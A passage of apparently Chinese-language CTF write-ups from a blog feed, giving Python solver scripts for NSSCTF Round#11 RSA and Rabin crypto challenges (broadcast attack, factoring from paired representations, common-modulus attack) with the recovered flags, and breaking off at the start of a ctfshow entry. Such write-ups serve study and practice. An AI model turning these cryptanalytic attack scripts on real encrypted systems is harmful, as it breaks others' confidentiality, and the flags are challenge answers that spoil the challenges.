class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>x1<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>q<span class="token punctuation">,</span>p<span class="token punctuation">)</span>cs <span class="token operator">=</span> <span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ps <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> c2 <span class="token keyword">in</span> cs<span class="token punctuation">:</span>        r <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>        s <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> <span class="token punctuation">(</span>q <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>        x <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">*</span> x1 <span class="token operator">*</span> q <span class="token operator">+</span> s <span class="token operator">*</span> x0 <span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> n        y <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">*</span> x1 <span class="token operator">*</span> q <span class="token operator">-</span> s <span class="token operator">*</span> x0 <span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> n        <span class="token keyword">if</span> x <span class="token keyword">not</span> <span class="token keyword">in</span> ps<span class="token punctuation">:</span>            ps<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">if</span> n <span class="token operator">-</span> x <span class="token keyword">not</span> <span class="token keyword">in</span> ps<span class="token punctuation">:</span>            ps<span class="token punctuation">.</span>append<span class="token punctuation">(</span>n <span class="token operator">-</span> x<span class="token punctuation">)</span>        <span class="token keyword">if</span> y <span class="token keyword">not</span> <span class="token keyword">in</span> ps<span class="token punctuation">:</span>            ps<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token keyword">if</span> n <span class="token operator">-</span> y <span class="token keyword">not</span> <span class="token keyword">in</span> ps<span class="token punctuation">:</span>            ps<span class="token punctuation">.</span>append<span class="token punctuation">(</span>n <span class="token operator">-</span> y<span class="token punctuation">)</span>    cs <span class="token operator">=</span> ps<span class="token keyword">for</span> m <span class="token keyword">in</span> ps<span class="token punctuation">:</span>    flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b"NSS"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">break</span>                <span class="token comment"># NSSCTF&#123;f594e3cd-2b9f-4fbf-992b-40e51897798e&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="MyMessage"><a href="#MyMessage" class="headerlink" title="MyMessage"></a>MyMessage</h1><p>交互式得低指加密广播攻击</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span>e <span class="token operator">=</span> <span class="token number">127</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28154</span><span class="token punctuation">)</span><span class="token comment">#命令简写化</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims    <span class="token punctuation">:</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment">#接收数据直到delims截止，Ture是不舍弃delims</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>c<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"Input message："</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"n: "</span><span class="token punctuation">)</span>    n<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"Token: "</span><span class="token punctuation">)</span>    c<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print(n,hex(c[0]))</span><span class="token keyword">def</span> <span class="token function">CRT</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> ai<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">reduce</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">,</span> mi<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">isinstance</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>ai<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    M <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">*</span> y<span class="token punctuation">,</span> mi<span class="token punctuation">)</span>    ai_ti_Mi <span class="token operator">=</span> <span class="token punctuation">[</span>a <span class="token operator">*</span> <span class="token punctuation">(</span>M <span class="token operator">//</span> m<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>M <span class="token operator">//</span> m<span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> ai<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">+</span> y<span class="token punctuation">,</span> ai_ti_Mi<span class="token punctuation">)</span> <span class="token operator">%</span> Mm<span class="token operator">=</span>CRT<span class="token punctuation">(</span>n<span class="token punctuation">,</span>c<span class="token punctuation">)</span>M <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token comment">#NSSCTF&#123;c05c93d8-20de-433d-8202-3d8262f31bc0&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ez-fac"><a href="#ez-fac" class="headerlink" title="ez_fac"></a>ez_fac</h1><p>题目</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> random<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span>a0<span class="token punctuation">,</span>a1<span class="token punctuation">,</span>b0<span class="token punctuation">,</span>b1p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>e <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>q<span class="token keyword">assert</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a0<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> e <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>b0<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> n<span class="token keyword">assert</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> e <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>b1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> nm <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a0="</span><span class="token punctuation">,</span>a0<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a1="</span><span class="token punctuation">,</span>a1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b0="</span><span class="token punctuation">,</span>b0<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b1="</span><span class="token punctuation">,</span>b1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本</p><p><img src="/2023/04/09/NSSCTF-Round-11/image-20230408223534160.png" alt="image-20230408223534160"></p><p>根据这个论文内容</p><p>p&#x3D;gcd(n,a0b1-a1b0)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumc<span class="token operator">=</span> <span class="token number">96496391731007518897413814188008837720590769169211349809877119278985060969026829802572421817888265342360728332919792452440257688078830103285268813765013959424069955273085274413461221917705521199430165698638444416803428336335625130197212968481383466732608552580369509828042748166516923158871160383760272230369</span>n<span class="token operator">=</span> <span class="token number">141463050429131153304507639706519453416500899516192888621725244147759861249532811353612272262251738001327556271543066487909395260247788929891078913533139738961651278577096628336832901751330655366664417508431204965468392923655570929035177816875190252113101286809899310780398065797539784080443884076015636565653</span>a0<span class="token operator">=</span> <span class="token number">11893824045660468459077133582738838417842593231821092698714037336632395431658199472925765178830611973650766264632249341194655235407390022682840914711732709</span>a1<span class="token operator">=</span> <span class="token number">11893824045660468459077133226975764782410316195614509064302075133171334301975298793502355669613006211742097696027917390142838498212910217928927499841689611</span>b0<span class="token operator">=</span> <span class="token number">72637686840312330318324544577081835760892845722490802999295104254521408572725988691542710106291484785108130437411841119266</span>b1<span class="token operator">=</span> <span class="token number">199793516086267640308411342691103208215027194945128541613925289581349442759392411456693594969683135744315154264882943680006</span>p<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n<span class="token punctuation">,</span>a0<span class="token operator">*</span>b1<span class="token operator">-</span>a1<span class="token operator">*</span>b0<span class="token punctuation">)</span>q<span class="token operator">=</span>n<span class="token operator">//</span>pe<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>a0<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">pow</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>b1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">pow</span><span class="token punctuation">(</span>b0<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#NSSCTF&#123;e2e87199-7473-4548-bc29-0e1ddccd1adb&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="MyGame"><a href="#MyGame" class="headerlink" title="MyGame"></a>MyGame</h1><p>题目</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token keyword">import</span> stringflag <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''=---menu---=1. Guess2. Encrypt'''</span><span class="token punctuation">)</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>q<span class="token keyword">def</span> <span class="token function">randommsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>mymsg <span class="token operator">=</span> randommsg<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">guess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> mymsg    msg <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> msg <span class="token operator">==</span> mymsg<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>mymsg<span class="token punctuation">)</span>        mymsg <span class="token operator">=</span> randommsg<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    e <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>mymsg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Cipher_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'n: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        opt <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> opt <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            guess<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> opt <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>            encrypt<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> re<span class="token keyword">import</span> binascii<span class="token punctuation">,</span> gmpy2<span class="token keyword">import</span> libnum<span class="token comment"># ------------ 交互部分 ------------</span>host <span class="token operator">=</span> <span class="token string">'node1.anna.nssctf.cn'</span>port <span class="token operator">=</span> <span class="token number">28935</span>conn <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>data1 <span class="token operator">=</span> conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'n: (\d+)'</span><span class="token punctuation">,</span> data1<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">interact_with_server</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">:</span>    conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    data1 <span class="token operator">=</span> conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data1<span class="token punctuation">)</span>    e<span class="token punctuation">,</span> c <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'Cipher_(\d+): (\d+)'</span><span class="token punctuation">,</span> data1<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    e <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token keyword">return</span> e<span class="token punctuation">,</span> c<span class="token comment">#共模攻击</span><span class="token comment">#共模攻击函数</span><span class="token keyword">def</span> <span class="token function">rsa_gong_N_def</span><span class="token punctuation">(</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> n<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>e1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>e2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>    s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s1 <span class="token operator">=</span> <span class="token operator">-</span> s1        c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s2 <span class="token operator">=</span> <span class="token operator">-</span> s2        c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>s1<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2 <span class="token punctuation">,</span>s2 <span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>e1<span class="token punctuation">,</span>c1<span class="token operator">=</span>interact_with_server<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>e2<span class="token punctuation">,</span>c2<span class="token operator">=</span>interact_with_server<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>m <span class="token operator">=</span> rsa_gong_N_def<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#NSSCTF&#123;0d11d1d2-22c5-41ec-88c8-b3e70cb61a0b&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NSSCTF Round#11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 ctfshow愚人杯</title>
      <link href="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/"/>
      <url>/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h1><p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406194116453.png" alt="image-20230406194116453"></p><p>ctfshow{一个不能说的秘密}</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>低端的base64</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token punctuation">,</span>base64<span class="token punctuation">,</span>re<span class="token keyword">import</span> itertools<span class="token punctuation">,</span> tqdmx<span class="token operator">=</span><span class="token 